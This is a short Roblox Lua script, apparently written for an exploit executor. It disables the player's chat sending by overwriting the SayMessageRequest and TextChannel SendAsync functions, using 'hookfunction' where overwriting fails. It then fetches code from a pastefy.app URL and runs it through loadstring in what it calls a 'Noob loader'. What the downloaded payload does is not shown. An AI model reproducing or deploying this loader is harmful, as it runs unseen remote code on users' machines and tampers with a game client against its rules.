local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TextChatService = game:GetService("TextChatService")

pcall(function()
    local ev = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
    if ev then
        local say = ev:FindFirstChild("SayMessageRequest")
        if say and typeof(say.FireServer) == "function" then
            say.FireServer = function() end
        end
    end
end)

task.spawn(function()
    local function try_patch(channel)
        pcall(function()
            if channel and channel.ClassName == "TextChannel" then
                local ok, _ = pcall(function() channel.SendAsync = function() end end)
                if not ok then
                    if hookfunction and typeof(channel.SendAsync) == "function" then
                        pcall(function()
                            local orig = channel.SendAsync
                            pcall(function() hookfunction(orig, function() end) end)
                        end)
                    end
                end
            end
        end)
    end

    local textChannels = TextChatService:FindFirstChild("TextChannels") or TextChatService:WaitForChild("TextChannels", 10)
    if textChannels then
        for _, c in ipairs(textChannels:GetChildren()) do
            try_patch(c)
        end
        textChannels.ChildAdded:Connect(try_patch)
    else
        while not TextChatService:FindFirstChild("TextChannels") do
            task.wait(0.5)
        end
        local tc = TextChatService.TextChannels
        for _, c in ipairs(tc:GetChildren()) do try_patch(c) end
        tc.ChildAdded:Connect(try_patch)
    end
end)

task.delay(0.15, function()
    local ok, res = pcall(function()
        return -- script
loadstring(game:HttpGet("https://pastefy.app/SSa5KnZr/raw"))()
    end)
    if not ok then
        warn("Noob loader failed:", res)
    end
end)
